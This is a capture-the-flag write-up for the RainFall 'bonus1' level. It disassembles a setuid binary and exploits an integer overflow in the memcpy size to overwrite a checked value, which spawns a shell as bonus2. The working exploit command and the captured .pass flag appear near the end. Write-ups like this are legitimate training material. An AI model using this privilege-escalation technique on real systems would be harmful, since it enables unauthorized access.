```sh
bonus1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 42
bonus1@RainFall:~$ ./bonus1 42 42
```
There is one excutable file **bonus1**, it takes argument, but do nothing. without argument, its segmentaion fault. \
\
Run the binary file with GDB.
```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   %ebp
   0x08048425 <+1>:     mov    %esp,%ebp
   0x08048427 <+3>:     and    $0xfffffff0,%esp
   0x0804842a <+6>:     sub    $0x40,%esp # buffer[40]
   0x0804842d <+9>:     mov    0xc(%ebp),%eax
   0x08048430 <+12>:    add    $0x4,%eax
   0x08048433 <+15>:    mov    (%eax),%eax
   0x08048435 <+17>:    mov    %eax,(%esp)
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    %eax,0x3c(%esp) # return value of atoi
   0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp) # if (nb <= 9) 
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    $0x1,%eax
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
   0x0804844f <+43>:    mov    0x3c(%esp),%eax # nb
   0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx # nb * 4 -2147483648 * 4 = 44
   0x0804845a <+54>:    mov    0xc(%ebp),%eax # argv[2]
   0x0804845d <+57>:    add    $0x8,%eax
   0x08048460 <+60>:    mov    (%eax),%eax
   0x08048462 <+62>:    mov    %eax,%edx
   0x08048464 <+64>:    lea    0x14(%esp),%eax # buffer[40], 0x3c - 0x14 = 40
   0x08048468 <+68>:    mov    %ecx,0x8(%esp)
   0x0804846c <+72>:    mov    %edx,0x4(%esp)
   0x08048470 <+76>:    mov    %eax,(%esp) # buffer
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt> # memcpy(dest, src, size)
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp) # compare 1464814662
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    movl   $0x0,0x8(%esp) # null
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp) # sh
   0x08048492 <+110>:   movl   $0x8048583,(%esp) # /bin/sh
   0x08048499 <+117>:   call   0x8048350 <execl@plt> # execl("/bin/sh", "sh", 0);
   0x0804849e <+122>:   mov    $0x0,%eax
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
```
There is just main function, which turns ```argv[1]``` into number with ```atoi()``` then checks if the number is lower or equal than 9 (main+29). \
But later to call ```execl()``` function our nb must be exact value ```0x574f4c46``` (main+84), so 2 different values required without any modification. \
To archive this we have to recall about int number overflow, which we can make happen on ```nb * 4```. \
And since we have to overwrite our nb using ```memcpy()``` we have to put size parameter at least 44, because difference between ```int nb``` and ```char buffer[40]``` is 40 and 4 bytes for the number ```0x574f4c46``` to put in nb. \
So we have to find the magic number than can be smaller than 10, but more than 44 when multiply by 4. \
In our case we used ```-2147483600``` then gave for the second argument string with 40 characters + our number to overwrite to nb ```0x574f4c46```.
```sh
bonus1@RainFall:~$ ./bonus1 -2147483600 $(python -c 'print "B" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
bonus1 passed !